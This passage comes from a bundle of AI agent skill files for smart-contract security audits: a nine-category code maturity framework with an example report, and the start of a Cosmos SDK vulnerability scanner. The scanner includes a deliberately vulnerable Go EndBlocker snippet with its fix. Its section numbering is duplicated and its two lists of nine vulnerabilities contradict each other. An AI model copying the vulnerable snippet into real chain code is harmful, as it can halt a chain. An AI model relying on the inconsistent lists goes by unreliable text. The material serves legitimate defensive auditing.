building-secure-contracts/not-so-smart-contracts/cairo/unchecked_l1_handler_from\n\n---\n",
        "plugins/building-secure-contracts/skills/code-maturity-assessor/SKILL.md": "---\nname: code-maturity-assessor\ndescription: Systematic code maturity assessment using Trail of Bits' 9-category framework. Analyzes codebase for arithmetic safety, auditing practices, access controls, complexity, decentralization, documentation, MEV risks, low-level code, and testing. Produces professional scorecard with evidence-based ratings and actionable recommendations.\n---\n\n# Code Maturity Assessor\n\n## Purpose\n\nSystematically assesses codebase maturity using Trail of Bits' 9-category framework. Provides evidence-based ratings and actionable recommendations.\n\n**Framework**: Building Secure Contracts - Code Maturity Evaluation v0.1.0\n\n---\n\n## How This Works\n\n### Phase 1: Discovery\nExplores the codebase to understand:\n- Project structure and platform\n- Contract/module files\n- Test coverage\n- Documentation availability\n\n### Phase 2: Analysis\nFor each of 9 categories, I'll:\n- **Search the code** for relevant patterns\n- **Read key files** to assess implementation\n- **Present findings** with file references\n- **Ask clarifying questions** about processes I can't see in code\n- **Determine rating** based on criteria\n\n### Phase 3: Report\nGenerates:\n- Executive summary\n- Maturity scorecard (ratings for all 9 categories)\n- Detailed analysis with evidence\n- Priority-ordered improvement roadmap\n\n---\n\n## Rating System\n\n- **Missing (0)**: Not present/not implemented\n- **Weak (1)**: Several significant improvements needed\n- **Moderate (2)**: Adequate, can be improved\n- **Satisfactory (3)**: Above average, minor improvements\n- **Strong (4)**: Exceptional, only small improvements possible\n\n**Rating Logic**:\n- ANY \"Weak\" criteria  **Weak**\n- NO \"Weak\" + SOME \"Moderate\" unmet  **Moderate**\n- ALL \"Moderate\" + SOME \"Satisfactory\" met  **Satisfactory**\n- ALL \"Satisfactory\" + exceptional practices  **Strong**\n\n---\n\n## The 9 Categories\n\nI assess 9 comprehensive categories covering all aspects of code maturity. For detailed criteria, analysis approaches, and rating thresholds, see [ASSESSMENT_CRITERIA.md](resources/ASSESSMENT_CRITERIA.md).\n\n### Quick Reference:\n\n**1. ARITHMETIC**\n- Overflow protection mechanisms\n- Precision handling and rounding\n- Formula specifications\n- Edge case testing\n\n**2. AUDITING**\n- Event definitions and coverage\n- Monitoring infrastructure\n- Incident response planning\n\n**3. AUTHENTICATION / ACCESS CONTROLS**\n- Privilege management\n- Role separation\n- Access control testing\n- Key compromise scenarios\n\n**4. COMPLEXITY MANAGEMENT**\n- Function scope and clarity\n- Cyclomatic complexity\n- Inheritance hierarchies\n- Code duplication\n\n**5. DECENTRALIZATION**\n- Centralization risks\n- Upgrade control mechanisms\n- User opt-out paths\n- Timelock/multisig patterns\n\n**6. DOCUMENTATION**\n- Specifications and architecture\n- Inline code documentation\n- User stories\n- Domain glossaries\n\n**7. TRANSACTION ORDERING RISKS**\n- MEV vulnerabilities\n- Front-running protections\n- Slippage controls\n- Oracle security\n\n**8. LOW-LEVEL MANIPULATION**\n- Assembly usage\n- Unsafe code sections\n- Low-level calls\n- Justification and testing\n\n**9. TESTING & VERIFICATION**\n- Test coverage\n- Fuzzing and formal verification\n- CI/CD integration\n- Test quality\n\nFor complete assessment criteria including what I'll analyze, what I'll ask you, and detailed rating thresholds (WEAK/MODERATE/SATISFACTORY/STRONG), see [ASSESSMENT_CRITERIA.md](resources/ASSESSMENT_CRITERIA.md).\n\n---\n\n## Example Output\n\nWhen the assessment is complete, you'll receive a comprehensive maturity report including:\n\n- **Executive Summary**: Overall score, top 3 strengths, top 3 gaps, priority recommendations\n- **Maturity Scorecard**: Table with all 9 categories rated with scores and notes\n- **Detailed Analysis**: Category-by-category breakdown with evidence (file:line references)\n- **Improvement Roadmap**: Priority-ordered recommendations (CRITICAL/HIGH/MEDIUM) with effort estimates\n\nFor a complete example assessment report, see [EXAMPLE_REPORT.md](resources/EXAMPLE_REPORT.md).\n\n---\n\n## Assessment Process\n\nWhen invoked, I will:\n\n1. **Explore codebase**\n   - Find contract/module files\n   - Identify test files\n   - Locate documentation\n\n2. **Analyze each category**\n   - Search for relevant code patterns\n   - Read key implementations\n   - Assess against criteria\n   - Collect evidence\n\n3. **Interactive assessment**\n   - Present my findings with file references\n   - Ask about processes I can't see in code\n   - Discuss borderline cases\n   - Determine ratings together\n\n4. **Generate report**\n   - Executive summary\n   - Maturity scorecard table\n   - Detailed category analysis with evidence\n   - Priority-ordered improvement roadmap\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"Found some findings, assessment complete\" | Assessment requires evaluating ALL 9 categories | Complete assessment of all 9 categories with evidence for each |\n| \"I see events, auditing category looks good\" | Events alone don't equal auditing maturity | Check logging comprehensiveness, testing, incident response processes |\n| \"Code looks simple, complexity is low\" | Visual simplicity masks composition complexity | Analyze cyclomatic complexity, dependency depth, state machine transitions |\n| \"Not a DeFi protocol, MEV category doesn't apply\" | MEV extends beyond DeFi (governance, NFTs, games) | Verify with transaction ordering analysis before declaring N/A |\n| \"No assembly found, low-level category is N/A\" | Low-level risks include external calls, delegatecall, inline assembly | Search for all low-level patterns before skipping category |\n| \"This is taking too long\" | Thorough assessment requires time per category | Complete all 9 categories, ask clarifying questions about off-chain processes |\n| \"I can rate this without evidence\" | Ratings without file:line references = unsubstantiated claims | Collect concrete code evidence for every category assessment |\n| \"User will know what to improve\" | Vague guidance = no action | Provide priority-ordered roadmap with specific improvements and effort estimates |\n\n---\n\n## Report Format\n\nFor detailed report structure and templates, see [REPORT_FORMAT.md](resources/REPORT_FORMAT.md).\n\n### Structure:\n\n1. **Executive Summary**\n   - Project name and platform\n   - Overall maturity (average rating)\n   - Top 3 strengths\n   - Top 3 critical gaps\n   - Priority recommendations\n\n2. **Maturity Scorecard**\n   - Table with all 9 categories\n   - Ratings and scores\n   - Key findings notes\n\n3. **Detailed Analysis**\n   - Per-category breakdown\n   - Evidence with file:line references\n   - Gaps and improvement actions\n\n4. **Improvement Roadmap**\n   - CRITICAL (immediate)\n   - HIGH (1-2 months)\n   - MEDIUM (2-4 months)\n   - Effort estimates and impact\n\n---\n\n## Ready to Begin\n\n**Estimated Time**: 30-40 minutes\n\n**I'll need**:\n- Access to full codebase\n- Your knowledge of processes (monitoring, incident response, team practices)\n- Context about the project (DeFi, NFT, infrastructure, etc.)\n\nLet's assess this codebase!\n",
        "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/ASSESSMENT_CRITERIA.md": "## The 9 Categories\n\n### 1. ARITHMETIC\n**Focus**: Overflow protection, precision handling, formula specification, edge case testing\n\n**I'll analyze**:\n- Overflow protection mechanisms (Solidity 0.8, SafeMath, checked_*, saturating_*)\n- Unchecked arithmetic blocks and documentation\n- Division/rounding operations\n- Arithmetic in critical functions (balances, rewards, fees)\n- Test coverage for arithmetic edge cases\n- Arithmetic specification documents\n\n**WEAK if**:\n- No overflow protection without justification\n- Unchecked arithmetic not documented\n- No arithmetic specification OR spec doesn't match code\n- No testing strategy for arithmetic\n- Critical edge cases not tested\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Unchecked arithmetic minimal, justified, documented\n- Overflow/underflow risks documented and tested\n- Explicit rounding for precision loss\n- Automated testing (fuzzing/formal methods)\n- Stateless arithmetic functions\n- Bounded parameters with explained ranges\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- Precision loss analyzed vs ground-truth\n- All trapping operations identified\n- Arithmetic spec matches code one-to-one\n- Automated testing covers all operations in CI\n\n---\n\n### 2. AUDITING\n**Focus**: Events, monitoring systems, incident response\n\n**I'll analyze**:\n- Event definitions and emission patterns\n- Events for critical operations (transfers, access changes, parameter updates)\n- Event naming consistency\n- Critical functions without events\n\n**I'll ask you**:\n- Off-chain monitoring infrastructure?\n- Monitoring plan documented?\n- Incident response plan exists and tested?\n\n**WEAK if**:\n- No event strategy\n- Events missing for critical updates\n- No consistent event guidelines\n- Same events reused for different purposes\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Events for all critical functions\n- Off-chain monitoring logs events\n- Monitoring plan documented\n- Event documentation (purpose, usage, assumptions)\n- Log review process documented\n- Incident response plan exists\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- Monitoring triggers alerts on unexpected behavior\n- Defined roles for incident detection\n- Incident response plan regularly tested\n\n---\n\n### 3. AUTHENTICATION / ACCESS CONTROLS\n**Focus**: Privilege management, role separation, access patterns\n\n**I'll analyze**:\n- Access control modifiers/functions\n- Role definitions and separation\n- Admin/owner patterns\n- Privileged function implementations\n- Test coverage for access controls\n\n**I'll ask you**:\n- Who are privileged actors? (EOA, multisig, DAO?)\n- Documentation of roles and privileges?\n- Key compromise scenarios?\n\n**WEAK if**:\n- Access controls unclear or inconsistent\n- Single address controls system without safeguards\n- Missing access controls on privileged functions\n- No role differentiation\n- All privileges on one address\n\n**MODERATE requires**:\n- All weak criteria resolved\n- All privileged functions have access control\n- Least privilege principle followed\n- Non-overlapping role privileges\n- Clear actor/privilege documentation\n- Tests cover all privileges\n- Roles can be revoked\n- Two-step processes for EOA operations\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- All actors well documented\n- Implementation matches specification\n- Privileged actors not EOAs\n- Key leakage doesn't compromise system\n- Tested against known attack vectors\n\n---\n\n### 4. COMPLEXITY MANAGEMENT\n**Focus**: Code clarity, function scope, avoiding unnecessary complexity\n\n**I'll analyze**:\n- Function length and nesting depth\n- Cyclomatic complexity\n- Code duplication\n- Inheritance hierarchies\n- Naming conventions\n- Function clarity\n\n**I'll ask you**:\n- Complex parts documented?\n- Naming convention documented?\n- Complexity measurements?\n\n**WEAK if**:\n- Unnecessary complexity hinders review\n- Functions overuse nested operations\n- Functions have unclear scope\n- Unnecessary code duplication\n- Complex inheritance tree\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Complex parts identified, minimized\n- High complexity (11) justified\n- Critical functions well-scoped\n- Minimal, justified redundancy\n- Clear inputs with validation\n- Documented naming convention\n- Types not misused\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- Minimal unnecessary complexity\n- Necessary complexity documented\n- Clear function purposes\n- Straightforward to test\n- No redundant behavior\n\n---\n\n### 5. DECENTRALIZATION\n**Focus**: Centralization risks, upgrade control, user opt-out\n\n**I'll analyze**:\n- Upgrade mechanisms (proxies, governance)\n- Owner/admin control scope\n- Timelock/multisig patterns\n- User opt-out mechanisms\n\n**I'll ask you**:\n- Upgrade mechanism and control?\n- User opt-out/exit paths?\n- Centralization risk documentation?\n\n**WEAK if**:\n- Centralization points not visible to users\n- Critical functions upgradable by single entity without opt-out\n- Single entity controls user funds\n- All decisions by single entity\n- Parameters changeable anytime by single entity\n- Centralized permission required\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Centralization risks identified, justified, documented\n- User opt-out/exit path documented\n- Upgradeability only for non-critical features\n- Privileged actors can't unilaterally move/trap funds\n- All privileges documented\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- Clear decentralization path justified\n- On-chain voting risks addressed OR no centralization\n- Deployment risks documented\n- External interaction risks documented\n- Critical parameters immutable OR users can exit\n\n---\n\n### 6. DOCUMENTATION\n**Focus**: Specifications, architecture, user stories, inline comments\n\n**I'll analyze**:\n- README, specification, architecture docs\n- Inline code comments (NatSpec, rustdoc, etc.)\n- User stories\n- Glossaries\n- Documentation completeness and accuracy\n\n**I'll ask you**:\n- User stories documented?\n- Architecture diagrams exist?\n- Glossary for domain terms?\n\n**WEAK if**:\n- Minimal or incomplete/outdated documentation\n- Only high-level description\n- Code comments don't match docs\n- Not publicly available (for public codebases)\n- Unexplained artificial terms\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Clear, unambiguous writing\n- Glossary for business terms\n- Architecture diagrams\n- User stories included\n- Core/critical components identified\n- Docs sufficient to understand behavior\n- All critical functions/blocks documented\n- Known risks/limitations documented\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- User stories cover all operations\n- Detailed behavior descriptions\n- Implementation matches spec (deviations justified)\n- Invariants clearly defined\n- Consistent naming conventions\n- Documentation for end-users AND developers\n\n---\n\n### 7. TRANSACTION ORDERING RISKS\n**Focus**: MEV, front-running, sandwich attacks\n\n**I'll analyze**:\n- MEV-vulnerable patterns (AMM swaps, arbitrage, large trades)\n- Front-running protections\n- Slippage/deadline checks\n- Oracle implementations\n\n**I'll ask you**:\n- Transaction ordering risks identified/documented?\n- Known MEV opportunities?\n- Mitigation strategies?\n- Testing for ordering attacks?\n\n**WEAK if**:\n- Ordering risks not identified/documented\n- Protocols/assets at risk from unexpected ordering\n- Relies on unjustified MEV prevention constraints\n- Unproven assumptions about MEV extractors\n\n**MODERATE requires**:\n- All weak criteria resolved\n- User operation ordering risks limited, justified, documented\n- MEV mitigations in place (delays, slippage checks)\n- Testing emphasizes ordering risks\n- Tamper-resistant oracles used\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- All ordering risks documented and justified\n- Known risks highlighted in docs/tests, visible to users\n- Documentation centralizes MEV opportunities\n- Privileged operation ordering risks limited, justified\n- Tests highlight ordering risks\n\n---\n\n### 8. LOW-LEVEL MANIPULATION\n**Focus**: Assembly, unsafe code, low-level operations\n\n**I'll analyze**:\n- Assembly blocks\n- Unsafe code sections\n- Low-level calls\n- Bitwise operations\n- Justification and documentation\n\n**I'll ask you**:\n- Why use assembly/unsafe here?\n- High-level reference implementation?\n- How is this tested?\n\n**WEAK if**:\n- Unjustified low-level manipulations\n- Assembly/low-level not justified, could be high-level\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Assembly use limited and justified\n- Inline comments for each operation\n- No re-implementation of established libraries without justification\n- High-level reference for complex assembly\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- Thorough documentation/justification/testing\n- Validated with automated testing vs reference\n- Differential fuzzing compares implementations\n- Compiler optimization risks identified\n\n---\n\n### 9. TESTING AND VERIFICATION\n**Focus**: Coverage, testing techniques, CI/CD\n\n**I'll analyze**:\n- Test file count and organization\n- Test coverage reports\n- CI/CD configuration\n- Advanced testing (fuzzing, formal verification)\n- Test quality and isolation\n\n**I'll ask you**:\n- Test coverage percentage?\n- Do all tests pass?\n- Testing techniques used?\n- Easy to run tests?\n\n**WEAK if**:\n- Limited testing, only happy paths\n- Common use cases not tested\n- Tests fail\n- Can't run tests \"out of the box\"\n\n**MODERATE requires**:\n- All weak criteria resolved\n- Most functions/use cases tested\n- All tests pass\n- Coverage reports available\n- Automated testing for critical components\n- Tests in CI/CD\n- Integration tests (if applicable)\n- Test code follows best practices\n\n**SATISFACTORY requires**:\n- All moderate criteria met\n- 100% reachable branch/statement coverage\n- End-to-end testing covers all entry points\n- Isolated test cases (no dependencies)\n- Mutation testing used\n",
        "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/EXAMPLE_REPORT.md": "## Example Output\n\nWhen the assessment is complete, you'll receive a comprehensive maturity report:\n\n```\n=== CODE MATURITY ASSESSMENT REPORT ===\n\nProject: DeFi DEX Protocol\nPlatform: Solidity (Ethereum)\nAssessment Date: March 15, 2024\nAssessor: Trail of Bits Code Maturity Framework v0.1.0\n\n---\n\n## EXECUTIVE SUMMARY\n\nOverall Maturity Score: 2.7 / 4.0 (MODERATE-SATISFACTORY)\n\nTop 3 Strengths:\n Comprehensive testing with 96% coverage and fuzzing\n Well-documented access controls with multi-sig governance\n Clear architectural documentation with diagrams\n\nTop 3 Critical Gaps:\n Arithmetic operations lack formal specification\n No event monitoring infrastructure deployed\n Centralized upgrade mechanism without timelock\n\nPriority Recommendation:\nImplement arithmetic specification document and add 48-hour timelock\nto all governance operations before mainnet launch.\n\n---\n\n## MATURITY SCORECARD\n\n| Category                    | Rating        | Score | Notes                           |\n|-----------------------------|---------------|-------|---------------------------------|\n| 1. Arithmetic               | WEAK          | 1/4   | Missing specification           |\n| 2. Auditing                 | MODERATE      | 2/4   | Events present, no monitoring   |\n| 3. Authentication/Access    | SATISFACTORY  | 3/4   | Multi-sig, well-documented      |\n| 4. Complexity Management    | MODERATE      | 2/4   | Some functions too complex      |\n| 5. Decentralization         | WEAK          | 1/4   | Centralized upgrades            |\n| 6. Documentation            | SATISFACTORY  | 3/4   | Comprehensive, minor gaps       |\n| 7. Transaction Ordering     | MODERATE      | 2/4   | Some MEV risks documented       |\n| 8. Low-Level Manipulation   | SATISFACTORY  | 3/4   | Minimal assembly, justified     |\n| 9. Testing & Verification   | STRONG        | 4/4   | Excellent coverage & techniques |\n\n**OVERALL: 2.7 / 4.0** (Moderate-Satisfactory)\n\n---\n\n## DETAILED ANALYSIS\n\n### 1. ARITHMETIC - WEAK (1/4)\n\n**Evidence:**\n No arithmetic specification document found\n AMM pricing formula not documented (src/SwapRouter.sol:89-156)\n Slippage calculation lacks precision analysis\n Using Solidity 0.8+ for overflow protection\n Critical functions tested for edge cases\n\n**Critical Gap:**\nFile: src/SwapRouter.sol:127\n```solidity\nuint256 amountOut = (reserveOut * amountIn * 997) / (reserveIn * 1000 + amountIn * 997);\n```\nNo specification for:\n- Expected liquidity depth ranges\n- Precision loss analysis\n- Rounding direction justification\n\n**To Reach Moderate (2/4):**\n- Create arithmetic specification document\n- Document all formulas and their precision requirements\n- Add explicit rounding direction comments\n- Test arithmetic edge cases with fuzzing\n\n**Files Referenced:**\n- src/SwapRouter.sol:89-156\n- src/LiquidityPool.sol:234-267\n- src/PriceCalculator.sol:178-195\n\n---\n\n### 2. AUDITING - MODERATE (2/4)\n\n**Evidence:**\n Events emitted for all critical operations\n Consistent event naming (Action + noun)\n Indexed parameters for filtering\n No off-chain monitoring infrastructure\n No monitoring plan documented\n No incident response plan\n\n**Events Found:** 23 events across 8 contracts\n- Swap, AddLiquidity, RemoveLiquidity \n- PairCreated, LiquidityProvided \n- OwnershipTransferred, GovernanceProposed \n\n**Critical Gap:**\nNo monitoring alerts for:\n- Large swaps causing significant price impact\n- Oracle price deviations\n- Unusual liquidity withdrawal patterns\n\n**To Reach Satisfactory (3/4):**\n- Deploy off-chain monitoring (Tenderly/Defender)\n- Create monitoring playbook document\n- Set up alerts for critical events\n- Test incident response plan quarterly\n\n---\n\n### 3. AUTHENTICATION/ACCESS CONTROLS - SATISFACTORY (3/4)\n\n**Evidence:**\n All privileged functions have access controls\n Multi-sig (3/5) controls governance\n Role separation (Admin, Operator, Pauser)\n Roles documented in ROLES.md\n Two-step ownership transfer\n All access patterns tested\n Emergency pause by separate role\n\n**Access Control Implementation:**\n- OpenZeppelin AccessControl used consistently\n- 4 roles defined with non-overlapping privileges\n- Emergency functions require multi-sig\n\n**Minor Gap:**\nMulti-sig is EOA-based (should upgrade to Governor contract)\n\n**To Reach Strong (4/4):**\n- Replace multi-sig EOAs with on-chain Governor\n- Add timelock to all parameter changes\n- Document key compromise scenarios\n- Test governor upgrade path\n\n**Files Referenced:**\n- All contracts use consistent access patterns\n- ROLES.md comprehensive\n- test/access/* covers all scenarios\n\n---\n\n### 9. TESTING & VERIFICATION - STRONG (4/4)\n\n**Evidence:**\n 96% line coverage, 94% branch coverage\n 287 unit tests, all passing\n Echidna fuzzing for 12 invariants\n Integration tests for all workflows\n Mutation testing implemented\n Tests run in CI/CD\n Fork tests against mainnet state\n\n**Testing Breakdown:**\n- Unit: 287 tests (forge test)\n- Integration: 45 scenarios (end-to-end flows)\n- Fuzzing: 12 invariants (Echidna, 10k runs each)\n- Formal: 3 key properties (Certora)\n- Fork: Tested against live Uniswap/SushiSwap\n\n**Uncovered Code:**\n- Emergency migration (tested manually)\n- Governance upgrade path (one-time)\n\n**Why Strong:**\nExceeds all satisfactory criteria with formal verification and\nextensive fuzzing. Test quality is exceptional.\n\n---\n\n## IMPROVEMENT ROADMAP\n\n### CRITICAL (Fix Before Mainnet - Week 1-2)\n\n**1. Create Arithmetic Specification [HIGH IMPACT]**\n- Effort: 3-5 days\n- Document all formulas with ground-truth models\n- Analyze precision loss for each operation\n- Justify rounding directions\n- Impact: Moves Arithmetic from WEAK  MODERATE\n\n**2. Add Governance Timelock [HIGH IMPACT]**\n- Effort: 2-3 days\n- Deploy TimelockController (48-hour delay)\n- Update all governance functions\n- Document emergency override procedure\n- Impact: Moves Decentralization from WEAK  MODERATE\n\n---\n\n### HIGH PRIORITY (Fix Before Launch - Week 3-4)\n\n**3. Deploy Monitoring Infrastructure [MEDIUM IMPACT]**\n- Effort: 3-4 days\n- Set up Tenderly/OpenZeppelin Defender\n- Create alert rules for critical events\n- Document monitoring playbook\n- Impact: Moves Auditing from MODERATE  SATISFACTORY\n\n**4. Simplify Complex Functions [MEDIUM IMPACT]**\n- Effort: 5-7 days\n- Split SwapRouter.getAmountOut() (cyclomatic complexity: 15)\n- Extract PriceCalculator._validateSlippage() logic\n- Impact: Moves Complexity from MODERATE  SATISFACTORY\n\n---\n\n### MEDIUM PRIORITY (Improve for V2 - Month 2-3)\n\n**5. Document MEV Risks**\n- Effort: 2-3 days\n- Create MEV analysis document\n- Add slippage protection where missing\n- Impact: Moves Transaction Ordering from MODERATE  SATISFACTORY\n\n**6. Upgrade to On-Chain Governance**\n- Effort: 1-2 weeks\n- Replace multi-sig with Governor contract\n- Add voting period and quorum\n- Impact: Moves Authentication from SATISFACTORY  STRONG\n\n---\n\n## CONCLUSION\n\nThe codebase demonstrates **MODERATE-SATISFACTORY maturity** (2.7/4.0),\nwith excellent testing practices and good documentation. Primary concerns\nare arithmetic specification gaps and centralized upgrade control.\n\n**Recommended Path to Mainnet:**\n1. Complete CRITICAL items (arithmetic spec, timelock)\n2. Address HIGH priority items (monitoring, complexity)\n3. Conduct external audit\n4. Launch with documented limitations\n5. Implement MEDIUM priority items in V2\n\n**Timeline:** 3-4 weeks to address critical/high items before audit.\n\n---\n\nAssessment completed using Trail of Bits Building Secure Contracts\nCode Maturity Evaluation Framework v0.1.0\n```\n",
        "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/REPORT_FORMAT.md": "\n## Report Format\n\n### Executive Summary\n- Project name and platform\n- Overall maturity (average rating)\n- Top 3 strengths\n- Top 3 critical gaps\n- Priority recommendations\n\n### Maturity Scorecard\n| Category | Rating | Notes |\n|----------|--------|-------|\n| Arithmetic | [Rating] | [Key findings] |\n| Auditing | [Rating] | [Key findings] |\n| ... | ... | ... |\n\n**Overall**: [X.X / 4.0]\n\n### Detailed Analysis\nFor each category:\n- Rating with justification\n- Evidence from codebase (file:line references)\n- Gaps identified\n- Actions to reach next level\n\n### Improvement Roadmap\nPriority-ordered recommendations:\n- **CRITICAL** (immediate)\n- **HIGH** (1-2 months)\n- **MEDIUM** (2-4 months)\n\nEach with effort estimate and impact\n",
        "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner/SKILL.md": "---\nname: cosmos-vulnerability-scanner\ndescription: Scans Cosmos SDK blockchains for 9 consensus-critical vulnerabilities including non-determinism, incorrect signers, ABCI panics, and rounding errors. Use when auditing Cosmos chains or CosmWasm contracts.\n---\n\n# Cosmos Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan Cosmos SDK blockchain modules and CosmWasm smart contracts for platform-specific security vulnerabilities that can cause chain halts, consensus failures, or fund loss. This skill encodes 9 critical vulnerability patterns unique to Cosmos-based chains.\n\n## 2. When to Use This Skill\n\n- Auditing Cosmos SDK modules (custom x/ modules)\n- Reviewing CosmWasm smart contracts (Rust)\n- Pre-launch security assessment of Cosmos chains\n- Investigating chain halt incidents\n- Validating consensus-critical code changes\n- Reviewing ABCI method implementations\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **Go files**: `.go`, `.proto`\n- **CosmWasm**: `.rs` (Rust with cosmwasm imports)\n\n### Language/Framework Markers\n```go\n// Cosmos SDK indicators\nimport (\n    \"github.com/cosmos/cosmos-sdk/types\"\n    sdk \"github.com/cosmos/cosmos-sdk/types\"\n    \"github.com/cosmos/cosmos-sdk/x/...\"\n)\n\n// Common patterns\nkeeper.Keeper\nsdk.Msg, GetSigners()\nBeginBlocker, EndBlocker\nCheckTx, DeliverTx\nprotobuf service definitions\n```\n\n```rust\n// CosmWasm indicators\nuse cosmwasm_std::*;\n#[entry_point]\npub fn execute(deps: DepsMut, env: Env, info: MessageInfo, msg: ExecuteMsg)\n```\n\n### Project Structure\n- `x/modulename/` - Custom modules\n- `keeper/keeper.go` - State management\n- `types/msgs.go` - Message definitions\n- `abci.go` - BeginBlocker/EndBlocker\n- `handler.go` - Message handlers (legacy)\n\n### Tool Support\n- **CodeQL**: Custom rules for non-determinism and panics\n- **go vet**, **golangci-lint**: Basic Go static analysis\n- **Manual review**: Critical for consensus issues\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for Cosmos SDK modules\n2. **Analyze each module** for the 9 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Check message handlers** for validation issues\n\n---\n\n## 5. Example Output\n\nWhen vulnerabilities are found, you'll get a report like this:\n\n```\n=== COSMOS SDK VULNERABILITY SCAN RESULTS ===\n\nProject: my-cosmos-chain\nFiles Scanned: 6 (.go)\nVulnerabilities Found: 2\n\n---\n\n[CRITICAL] Incorrect GetSigners()\n\n---\n\n## 5. Vulnerability Patterns (9 Patterns)\n\nI check for 9 critical vulnerability patterns unique to CosmWasm. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Missing Denom Validation**  CRITICAL - Accepting arbitrary token denoms\n2. **Insufficient Authorization**  CRITICAL - Missing sender/admin validation\n3. **Missing Balance Check**  HIGH - Not verifying sufficient balances\n4. **Improper Reply Handling**  HIGH - Unsafe submessage reply processing\n5. **Missing Reply ID Check**  MEDIUM - Not validating reply IDs\n6. **Improper IBC Packet Validation**  CRITICAL - Unvalidated IBC packets\n7. **Unvalidated Execute Message**  HIGH - Missing message validation\n8. **Integer Overflow**  HIGH - Unchecked arithmetic operations\n9. **Reentrancy via Submessages**  MEDIUM - State changes before submessages\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n## 5. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Identify Cosmos SDK version (`go.mod`)\n2. Locate custom modules (`x/*/`)\n3. Find ABCI methods (`abci.go`, BeginBlocker, EndBlocker)\n4. Identify message types (`types/msgs.go`, `.proto`)\n\n### Step 2: Critical Path Analysis\nFocus on consensus-critical code:\n- BeginBlocker / EndBlocker implementations\n- Message handlers (execute, DeliverTx)\n- Keeper methods that modify state\n- CheckTx priority logic\n\n### Step 3: Non-Determinism Sweep\n**This is the highest priority check for Cosmos chains.**\n\n```bash\n# Search for non-deterministic patterns\ngrep -r \"range.*map\\[\" x/\ngrep -r \"\\bint\\b\\|\\buint\\b\" x/ | grep -v \"int32\\|int64\\|uint32\\|uint64\"\ngrep -r \"float32\\|float64\" x/\ngrep -r \"go func\\|go routine\" x/\ngrep -r \"select {\" x/\ngrep -r \"time.Now()\" x/\ngrep -r \"rand\\.\" x/\n```\n\nFor each finding:\n1. Verify it's in consensus-critical path\n2. Confirm it causes non-determinism\n3. Assess severity (chain halt vs data inconsistency)\n\n### Step 4: ABCI Method Analysis\nReview BeginBlocker and EndBlocker:\n- [ ] Computational complexity bounded?\n- [ ] No unbounded iterations?\n- [ ] No nested loops over large collections?\n- [ ] Panic-prone operations validated?\n- [ ] Benchmarked with maximum state?\n\n### Step 5: Message Validation\nFor each message type:\n- [ ] GetSigners() address matches handler usage?\n- [ ] All error returns checked?\n- [ ] Priority set in CheckTx if critical?\n- [ ] Handler registered (or using v0.47+ auto-registration)?\n\n### Step 6: Arithmetic & Bookkeeping\n- [ ] sdk.Dec operations use multiply-before-divide?\n- [ ] Rounding favors protocol over users?\n- [ ] Custom bookkeeping synchronized with x/bank?\n- [ ] Invariant checks in place?\n\n---\n\n## 6. Reporting Format\n\n### Finding Template\n```markdown\n## [CRITICAL] Non-Deterministic Map Iteration in EndBlocker\n\n**Location**: `x/dex/abci.go:45-52`\n\n**Description**:\nThe EndBlocker iterates over an unordered map to distribute rewards, causing different validators to process users in different orders and produce different state roots. This will halt the chain when validators fail to reach consensus.\n\n**Vulnerable Code**:\n```go\n// abci.go, line 45\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    rewards := k.GetPendingRewards(ctx)  // Returns map[string]sdk.Coins\n    for user, amount := range rewards {  // NON-DETERMINISTIC ORDER\n        k.bankKeeper.SendCoins(ctx, moduleAcc, user, amount)\n    }\n}\n```\n\n**Attack Scenario**:\n1. Multiple users have pending rewards\n2. Different validators iterate in different orders due to map randomization\n3. If any reward distribution fails mid-iteration, state diverges\n4. Validators produce different app hashes\n5. Chain halts - cannot reach consensus\n\n**Recommendation**:\nSort map keys before iteration:\n```go\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    rewards := k.GetPendingRewards(ctx)\n\n    // Collect and sort keys for deterministic iteration\n    users := make([]string, 0, len(rewards))\n    for user := range rewards {\n        users = append(users, user)\n    }\n    sort.Strings(users)  // Deterministic order\n\n    // Process in sorted order\n    for _, user := range users {\n        k.bankKeeper.SendCoins(ctx, moduleAcc, user, rewards[user])\n    }\n}\n```\n\n**References**:\n- building-secure-contracts/not-so-smart-contracts/cosmos/non_determinism\n- Cosmos SDK docs: Determinism\n```\n\n---\n\n## 7. Priority Guidelines\n\n### Critical - CHAIN HALT Risk\n- Non-determinism (any form)\n- ABCI method panics\n- Slow ABCI methods\n- Incorrect GetSigners (allows unauthorized actions)\n\n### High - Fund Loss Risk\n- Missing error handling (bankKeeper.SendCoins)\n- Broken bookkeeping (accounting mismatch)\n- Missing message priority (oracle/emergency messages)\n\n### Medium - Logic/DoS Risk\n- Rounding errors (protocol value leakage)\n- Unregistered message handlers (functionality broken)\n\n---\n\n## 8. Testing Recommendations\n\n### Non-Determinism Testing\n```bash\n# Build for 